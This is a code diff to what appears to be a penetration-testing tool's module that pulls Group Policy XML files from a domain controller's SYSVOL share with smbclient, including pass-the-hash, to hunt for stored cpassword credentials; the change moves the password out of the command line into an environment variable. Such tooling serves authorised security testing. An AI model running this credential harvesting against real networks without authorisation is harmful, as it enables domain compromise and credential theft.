@@ -1,8 +1,8 @@
 from __future__ import annotations
 
 import asyncio
+import os
 import re
-from pathlib import Path
 
 from .. import runner, ui
 from ..state import Findings, loot_dir
@@ -185,23 +185,22 @@ async def hunt_gpp_cpassword(findings: Findings, user: str, password: str | None
     )
     out_dir = loot_dir(findings.target.ip) / "sysvol"
     out_dir.mkdir(exist_ok=True)
-    auth = f"{findings.target.domain}/{user}"
     target = f"//{findings.target.ip}/SYSVOL"
     smb_cmd = "recurse ON; prompt OFF; mget *.xml; exit"
     cmd = [runner.resolve("smbclient") or "smbclient", target, "-W", findings.target.domain, "-U", user]
     if ntlm_hash:
         cmd += ["--pw-nt-hash", ntlm_hash.split(":")[-1]]
     elif password is not None:
-        cmd += [f"%{password}"] if False else []
         cmd += ["-c", smb_cmd]
-        env = {}
+        # Pass the password via $PASSWD (smbclient reads it from the env)
+        # instead of argv, so it doesn't leak through `ps` to other local users.
+        env = {**os.environ, "PASSWD": password}
         ui.cmd(cmd[:3] + ["[...]"])
-        result = await runner.run(cmd, timeout=180, cwd=out_dir, env=None,
-                                  stdin_data=password + "\n")
+        await runner.run(cmd, timeout=180, cwd=out_dir, env=env)
     else:
         cmd += ["-c", smb_cmd]
         ui.cmd(cmd)
-        result = await runner.run(cmd, timeout=180, cwd=out_dir)
+        await runner.run(cmd, timeout=180, cwd=out_dir)
 
     xml_files = list(out_dir.rglob("*.xml"))
     if not xml_files:
